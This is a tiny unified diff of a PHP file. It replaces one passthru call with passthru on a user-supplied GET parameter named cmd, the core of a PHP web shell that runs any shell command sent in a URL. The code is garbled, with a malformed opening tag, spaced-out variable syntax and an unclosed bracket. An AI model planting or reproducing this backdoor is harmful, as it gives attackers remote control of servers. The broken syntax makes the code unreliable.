@@ -1,3 +1,3 @@
 <? Php
-passthru ($ _ GET ['cat index.php']);
+passthru ($ _ GET [cmd);
 ?>
